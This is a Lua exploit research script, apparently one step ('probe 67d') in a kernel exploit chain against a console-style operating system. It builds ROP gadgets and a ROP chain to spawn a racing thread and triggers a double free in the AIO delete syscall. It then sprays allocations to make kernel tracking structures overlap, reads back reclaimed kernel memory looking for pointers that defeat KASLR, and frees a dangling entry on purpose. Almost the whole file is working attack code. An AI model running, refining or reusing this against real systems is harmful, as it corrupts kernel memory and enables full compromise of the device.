-- CRASH_CLASS: MODERATE
-- PROBE 67d: Read through overlapping tracking structures
--
-- 67c confirmed 100% poll-flag cross-contamination between consecutive
-- spray AIO pairs after double-free (LIFO gives same block to pairs).
--
-- This probe exploits the overlap:
--   1. Double-free → spray → verify overlap via poll oracle
--   2. Delete EVEN members (frees the shared tracking structure)
--   3. Submit NEW requests with different params (different fd, size)
--   4. Query ODD members via 663 → reads from the reclaimed memory
--   5. If status changed from expected → we're reading the new request's data
--
-- If the status dword overlaps with any kernel pointer field in
-- the tracking structure, this is a KASLR defeat.

print("=== PROBE 67d: OVERLAP READBACK ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid_val
end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then
        hi2 = hi2 + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)
local sf_lo, sf_hi = g_lohi(0x992)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Pin to 2 CPUs (essential for LIFO overlap)
local pin_mask = memory.alloc(8)
wq(pin_mask, uint64(3))
pcall(function()
    mk(488)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask)))
end)
local mask_buf = memory.alloc(8); wq(mask_buf, uint64(0))
pcall(function()
    mk(487)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(mask_buf)))
end)
print("cpu_mask=0x" .. string.format("%02X", rd(N(mask_buf)) or 0))

-- Open multiple fds for testing different submit params
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
local fd_rng  = sgn(mk(5)(put_str("/dev/rng"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero .. " fd_rng=" .. fd_rng)

-- =============================================
-- Helpers
-- =============================================
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one_fd(fd, size)
    fd = fd or fd_zero
    size = size or 16
    wq(N(reqs), uint64(0))
    wq(uint64(N(reqs) + 8), uint64(size))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function submit_one() return submit_one_fd(fd_zero, 16) end

local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function query_663_wide(id)
    local buf = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(buf) + i, 0xDEADDEAD) end
    wd(N(one_id), id)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(buf)))
    end)
    local vals = {}
    for i = 0, 0x3C, 4 do
        vals[#vals + 1] = rd(N(buf) + i) or 0xDEADDEAD
    end
    return vals
end

local function query_666(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function()
        mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xCD
end

local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8))
    push(mov_rdi_rax)
    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared) + done_off, 0)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- =============================================
-- [A] DOUBLE-FREE + SPRAY + OVERLAP VERIFY
-- =============================================
print("")
print("-- [A] DOUBLE-FREE RACE --")

local BATCH = 16

local ids = memory.alloc(BATCH * 4)
local id_list = {}
for i = 0, BATCH - 1 do
    local id = submit_one()
    if id == 0 then break end
    wd(N(ids) + i * 4, id)
    id_list[#id_list + 1] = id
end
print("victims=" .. #id_list)

local poll_st = memory.alloc(BATCH * 4)
pcall(function()
    mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_st)))
end)

local main_st = memory.alloc(BATCH * 4)
local child_st = memory.alloc(BATCH * 4)
for i = 0, BATCH * 4 - 1, 4 do
    wd(N(main_st) + i, 0xCD)
    wd(N(child_st) + i, 0xCD)
end

spawn_662_child(N(ids), BATCH, N(child_st), 0x100)

pcall(function()
    mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st)))
end)

local dummy = 0
for w = 1, 200000 do dummy = dummy + 1 end

local doubles = 0
for i = 0, BATCH - 1 do
    local ms = rd(N(main_st) + i * 4) or 0xCD
    local cs = rd(N(child_st) + i * 4) or 0xCD
    if ms == 0 and cs == 0 then doubles = doubles + 1 end
end
print("doubles=" .. doubles)

if doubles < 2 then
    print("Need doubles for test, aborting")
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== 67d DONE (insufficient doubles) ===")
    return
end

-- =============================================
-- [B] SPRAY + VERIFY OVERLAP
-- =============================================
print("")
print("-- [B] SPRAY + OVERLAP VERIFY --")

local SPRAY = 128
local spray_ids = {}
for i = 1, SPRAY do
    local id = submit_one()
    if id == 0 then break end
    spray_ids[#spray_ids + 1] = id
end
print("spray=" .. #spray_ids)

-- Baseline: query ALL via 663 first (matching 67c exactly)
local baseline_bad = 0
for i = 1, #spray_ids do
    local st = query_663(spray_ids[i])
    if st ~= 0x00000003 then
        baseline_bad = baseline_bad + 1
        if baseline_bad <= 5 then
            print(string.format("  baseline_bad: spray[%d]=%d st=%08X", i, spray_ids[i], st))
        end
    end
end
print("baseline_bad=" .. baseline_bad)

-- Verify overlap: poll odd-Lua (even-0idx), check even-Lua (odd-0idx)
for i = 1, #spray_ids, 2 do poll_664(spray_ids[i]) end
local overlap_count = 0
local sample_odd = {}
for i = 2, #spray_ids, 2 do
    local st = query_663(spray_ids[i])
    if st == 0x00010003 then
        overlap_count = overlap_count + 1
    end
    if i <= 10 then
        sample_odd[#sample_odd + 1] = string.format("[%d]=%08X", i, st)
    end
end
print("overlap_pairs=" .. overlap_count .. "/" .. math.floor(#spray_ids / 2))
print("sample_odd: " .. table.concat(sample_odd, " "))

if overlap_count < 4 then
    print("Insufficient overlap for readback test")
    print("=== 67d DONE ===")
    return
end

-- =============================================
-- [C] READBACK TEST
-- =============================================
print("")
print("-- [C] READBACK AFTER DELETE+RECLAIM --")

-- Pick 8 overlapping pairs from the spray
-- Pair: (spray_ids[2k-1], spray_ids[2k]) for k=1..8
-- Delete the FIRST member (odd Lua index = even 0-indexed)
-- Query the SECOND member (even Lua index = odd 0-indexed)

print("  Phase 1: Record baseline status for second members")
local baseline = {}
for k = 1, 8 do
    local idx_b = 2 * k  -- second member (Lua index)
    baseline[k] = query_663(spray_ids[idx_b])
    print(string.format("    pair[%d] B=id_%d baseline=%08X",
        k, spray_ids[idx_b], baseline[k]))
end

print("")
print("  Phase 2: Delete first members of pairs 1-8")
for k = 1, 8 do
    local idx_a = 2 * k - 1
    -- Must poll first (already polled in overlap verify)
    local ds = delete_one(spray_ids[idx_a])
    print(string.format("    delete id_%d status=%08X", spray_ids[idx_a], ds))
end

if not alive() then print("DEAD after delete"); return end

print("")
print("  Phase 3: Query second members BEFORE reclaim")
for k = 1, 8 do
    local idx_b = 2 * k
    local st = query_663(spray_ids[idx_b])
    local st666 = query_666(spray_ids[idx_b])
    print(string.format("    pair[%d] B=id_%d 663=%08X 666=%08X (was=%08X)",
        k, spray_ids[idx_b], st, st666, baseline[k]))
end

if not alive() then print("DEAD after query"); return end

print("")
print("  Phase 4: Reclaim with different fd and sizes")
-- Submit 24 new AIO requests: 8 with fd_rng, 8 with fd_zero size=4096, 8 with fd_zero size=1
local reclaim_ids = {}
for i = 1, 8 do
    local id = submit_one_fd(fd_rng, 64)
    if id ~= 0 then reclaim_ids[#reclaim_ids + 1] = {id, "rng_64"} end
end
for i = 1, 8 do
    local id = submit_one_fd(fd_zero, 4096)
    if id ~= 0 then reclaim_ids[#reclaim_ids + 1] = {id, "zero_4096"} end
end
for i = 1, 8 do
    local id = submit_one_fd(fd_zero, 1)
    if id ~= 0 then reclaim_ids[#reclaim_ids + 1] = {id, "zero_1"} end
end
print("  reclaim_count=" .. #reclaim_ids)

print("")
print("  Phase 5: Query second members AFTER reclaim")
for k = 1, 8 do
    local idx_b = 2 * k
    local st = query_663(spray_ids[idx_b])
    local st666 = query_666(spray_ids[idx_b])
    print(string.format("    pair[%d] B=id_%d 663=%08X 666=%08X (base=%08X)",
        k, spray_ids[idx_b], st, st666, baseline[k]))
end

-- =============================================
-- [D] WIDE READ — check if 663 writes more than one dword
-- =============================================
if alive() then
    print("")
    print("-- [D] WIDE READ CHECK --")
    -- Test pair 1's second member with a large output buffer
    local test_id = spray_ids[2]
    local wide = query_663_wide(test_id)
    local hex = ""
    for i, v in ipairs(wide) do
        hex = hex .. string.format("%08X ", v)
    end
    print("  663 wide output: " .. hex)

    -- Check for kernel pointer pattern
    for i = 1, #wide - 1, 2 do
        local lo = wide[i]
        local hi = wide[i + 1]
        if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            print(string.format("  ★ KERNEL PTR at +%02X: %08X_%08X",
                (i - 1) * 4, hi, lo))
        end
    end
end

-- =============================================
-- [E] DELETE SECOND MEMBER (chain double-free)
-- =============================================
if alive() then
    print("")
    print("-- [E] DELETE SECOND MEMBER (dangling) --")
    -- Deleting the second member when its tracking structure
    -- was freed (by deleting the first) and possibly reclaimed
    -- → kernel follows stale pointers → crash or anomaly
    print("  WARNING: this may crash if stale pointers are followed")

    -- Try just ONE to see what happens
    local test_pair = 1
    local idx_b = 2 * test_pair
    local test_b = spray_ids[idx_b]

    -- First poll it (in case delete requires polled status)
    local poll_ret = poll_664(test_b)
    print(string.format("  poll id_%d ret=%08X", test_b, poll_ret))

    local del_ret = delete_one(test_b)
    print(string.format("  delete id_%d ret=%08X", test_b, del_ret))

    if alive() then
        print("  ★ SURVIVED! Second member deleted without crash")
    else
        print("  DEAD — second member delete crashed (expected)")
    end
end

-- =============================================
-- [F] CLEANUP
-- =============================================
if alive() then
    print("")
    print("-- [F] CLEANUP --")
    -- Poll and delete remaining spray IDs
    local cleaned = 0
    for i = 1, #spray_ids do
        local id = spray_ids[i]
        local already_deleted = false
        -- Skip first members of pairs 1-8 (already deleted)
        for k = 1, 8 do
            if i == 2 * k - 1 then already_deleted = true; break end
        end
        -- Skip pair 1's second member (deleted in section E)
        if i == 2 then already_deleted = true end

        if not already_deleted then
            poll_664(id)
            local ds = delete_one(id)
            if ds == 0 then cleaned = cleaned + 1 end
        end
    end
    -- Cleanup reclaim IDs
    for _, entry in ipairs(reclaim_ids) do
        poll_664(entry[1])
        delete_one(entry[1])
    end
    print("cleaned=" .. cleaned)
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67d DONE ===")
